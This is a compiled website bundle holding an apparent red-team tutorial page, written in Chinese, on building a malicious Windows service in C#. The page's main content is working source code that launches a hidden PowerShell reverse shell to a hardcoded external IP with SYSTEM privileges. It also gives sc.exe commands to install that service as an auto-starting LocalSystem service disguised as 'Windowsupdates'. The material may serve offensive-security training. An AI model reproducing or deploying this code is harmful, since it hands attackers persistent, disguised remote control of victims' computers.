"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([["622"],{2495:function(e,n,s){s.r(n),s.d(n,{frontMatter:()=>o,default:()=>u,toc:()=>l,metadata:()=>t,assets:()=>d,contentTitle:()=>c});var t=JSON.parse('{"id":"Security/windowsservice","title":"\u5982\u4F55\u4F7F\u7528 C# \u5275\u5EFA\u60E1\u610F Windows \u670D\u52D9\u4F86\u56DE\u5F48\u7CFB\u7D71\u6B0A\u9650\u7684 shell","description":"\u5982\u4F55\u4F7F\u7528 C# \u5275\u5EFA\u60E1\u610F Windows \u670D\u52D9\u4F86\u56DE\u5F48\u7CFB\u7D71\u6B0A\u9650\u7684 shell","source":"@site/docs/Security/windowsservice.mdx","sourceDirName":"Security","slug":"/Security/windowsservice","permalink":"/RulerChen-Website/en/docs/Security/windowsservice","draft":false,"unlisted":false,"editUrl":"https://github.com/RulerChen/RulerChen-Website/tree/main/docs/Security/windowsservice.mdx","tags":[],"version":"current","lastUpdatedAt":1727616702000,"sidebarPosition":20,"frontMatter":{"title":"\u5982\u4F55\u4F7F\u7528 C# \u5275\u5EFA\u60E1\u610F Windows \u670D\u52D9\u4F86\u56DE\u5F48\u7CFB\u7D71\u6B0A\u9650\u7684 shell","sidebar_position":20,"description":"\u5982\u4F55\u4F7F\u7528 C# \u5275\u5EFA\u60E1\u610F Windows \u670D\u52D9\u4F86\u56DE\u5F48\u7CFB\u7D71\u6B0A\u9650\u7684 shell","keywords":["Windows Service","C#","Shell"]},"sidebar":"tutorialSidebar","previous":{"title":"[CVE-2021-44228] log4j \u6F0F\u6D1E\u5FA9\u73FE","permalink":"/RulerChen-Website/en/docs/Security/log4j"}}'),i=s(5893),r=s(65);let o={title:"\u5982\u4F55\u4F7F\u7528 C# \u5275\u5EFA\u60E1\u610F Windows \u670D\u52D9\u4F86\u56DE\u5F48\u7CFB\u7D71\u6B0A\u9650\u7684 shell",sidebar_position:20,description:"\u5982\u4F55\u4F7F\u7528 C# \u5275\u5EFA\u60E1\u610F Windows \u670D\u52D9\u4F86\u56DE\u5F48\u7CFB\u7D71\u6B0A\u9650\u7684 shell",keywords:["Windows Service","C#","Shell"]},c=void 0,d={},l=[{value:"\u6982\u8FF0",id:"\u6982\u8FF0",level:2},{value:"\u6B65\u9A5F",id:"\u6B65\u9A5F",level:2},{value:"\u53C3\u8003",id:"\u53C3\u8003",level:2}];function a(e){let n={a:"a",code:"code",h2:"h2",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.a)(),...e.components},{Head:s}=n;return s||function(e,n){throw Error("Expected "+(n?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Head",!0),(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(s,{children:(0,i.jsx)("title",{children:"\u5982\u4F55\u4F7F\u7528 C# \u5275\u5EFA\u60E1\u610F Windows \u670D\u52D9\u4F86\u56DE\u5F48\u7CFB\u7D71\u6B0A\u9650\u7684 shell"})}),"\n",(0,i.jsx)(n.h2,{id:"\u6982\u8FF0",children:"\u6982\u8FF0"}),"\n",(0,i.jsx)(n.p,{children:"\u672C\u6587\u627F\u63A5\u4E0A\u4E00\u7BC7 log4j \u7684\u5BE6\u4F5C\uFF0C\u4F7F\u7528 C# (Visual Studio 2022) \u4F86\u5275\u5EFA\u4E00\u500B\u60E1\u610F\u7684 Windows \u670D\u52D9\uFF0C\u7528\u4F86\u56DE\u5F48\u4E00\u500B\u7CFB\u7D71\u6B0A\u9650\u7684 shell\u3002"}),"\n",(0,i.jsx)(n.h2,{id:"\u6B65\u9A5F",children:"\u6B65\u9A5F"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"\u4F9D\u64DA\u4E0B\u65B9\u7684\u5F71\u7247\u5148\u5EFA\u7ACB\u7C21\u55AE\u7684 windows service"}),"\n",(0,i.jsx)(n.li,{children:"\u5728 .cs \u6A94\u6848\u4E0B\u65B0\u589E\u4EE5\u4E0B\u7A0B\u5F0F\u78BC"}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:["\u7531\u65BC windows service \u672C\u8EAB\u5C31\u5728 admin \u6B0A\u9650\u4E0B\u57F7\u884C\uFF0C\u6240\u4EE5\u4E0D\u9700\u8981 ",(0,i.jsx)(n.code,{children:"UAC"})," \u7684\u6B0A\u9650\u63D0\u5347\u3002"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-csharp",children:'using System;\nusing System.Diagnostics;\nusing System.IO;\nusing System.ServiceProcess;\n\nnamespace service\n{\n    public partial class Service1 : ServiceBase\n    {\n        public Service1()\n        {\n            InitializeComponent();\n        }\n\n        protected override void OnStart(string[] args)\n        {\n            try\n            {\n                System.Threading.Thread.Sleep(100000);\n\n                string payload = $@"\n                    $client = New-Object System.Net.Sockets.TCPClient(\'104.199.254.153\', 8000);\n                    $stream = $client.GetStream();\n                    $writer = New-Object System.IO.StreamWriter($stream);\n                    $reader = New-Object System.IO.StreamReader($stream);\n                    $writer.AutoFlush = $true;\n                    while ($true) {{\n                        $command = $reader.ReadLine();\n                        if ($command -eq \'exit\') {{ break }}\n                        $output = try {{ Invoke-Expression $command 2>&1 | Out-String }} catch {{ $_.Exception.Message }};\n                        $writer.WriteLine($output);\n                    }}\n                    $client.Close();";\n\n                ExecuteCommand(payload);\n            }\n            catch (Exception ex)\n            {\n                Console.WriteLine(ex.ToString());\n            }\n        }\n\n        protected override void OnStop()\n        {\n        }\n\n        private void ExecuteCommand(string command)\n        {\n            try\n            {\n                ProcessStartInfo psi = new ProcessStartInfo\n                {\n                    FileName = "powershell.exe",\n                    Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command " + command,\n                    CreateNoWindow = true,\n                    UseShellExecute = false,\n                    RedirectStandardOutput = true,\n                    RedirectStandardError = true\n                };\n\n                using (Process process = new Process { StartInfo = psi })\n                {\n                    process.Start();\n                    string output = process.StandardOutput.ReadToEnd();\n                    string error = process.StandardError.ReadToEnd();\n                    process.WaitForExit();\n                }\n            }\n            catch (Exception ex)\n            {\n                // \u8655\u7406\u7570\u5E38\n                Console.WriteLine("\u57F7\u884C PowerShell \u6307\u4EE4\u6642\u767C\u751F\u932F\u8AA4: " + ex.Message);\n            }\n        }\n    }\n}\n'})}),"\n",(0,i.jsxs)(n.p,{children:["build \u4E4B\u5F8C ",(0,i.jsx)(n.code,{children:"service/bin/Debug/service.exe"})," \u9019\u500B\u6A94\u6848\u5C31\u662F\u6211\u5011\u7684\u60E1\u610F windows service\uFF0C\u6211\u5011\u53EF\u4EE5\u5C07\u5176\u653E\u5230\u76EE\u6A19\u6A5F\u5668\u4E0A\u57F7\u884C\u3002"]}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u5C07 ",(0,i.jsx)(n.code,{children:"service.exe"})," \u653E\u5230\u76EE\u6A19\u6A5F\u5668\u4E0A\uFF0C\u4E26\u507D\u88DD\u6210\u5408\u6CD5\u7684\u670D\u52D9\u540D\u7A31"]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'& "C:\\Windows\\System32\\sc.exe" create Windowsupdates binPath= "C:\\Users\\redteam\\Desktop\\service.exe" start= auto obj= LocalSystem DisplayName= "windowsupdates"\n'})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'& "C:\\Windows\\System32\\sc.exe" start Windowsupdates\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u5982\u679C\u9700\u8981\u522A\u9664\u670D\u52D9\uFF0C\u53EF\u4EE5\u4F7F\u7528\u4EE5\u4E0B\u6307\u4EE4"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'& "C:\\Windows\\System32\\sc.exe" stop Windowsupdates\n& "C:\\Windows\\System32\\sc.exe" delete Windowsupdates\n'})}),"\n",(0,i.jsx)(n.h2,{id:"\u53C3\u8003",children:"\u53C3\u8003"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://www.youtube.com/watch?v=67DtZbPYNKg",children:"How to Create a Windows Service Using C# and Visual Studio!"})}),"\n"]})]})}function u(e={}){let{wrapper:n}={...(0,r.a)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(a,{...e})}):a(e)}},65:function(e,n,s){s.d(n,{Z:()=>c,a:()=>o});var t=s(7294);let i={},r=t.createContext(i);function o(e){let n=t.useContext(r);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:o(e.components),t.createElement(r.Provider,{value:n},e.children)}}}]);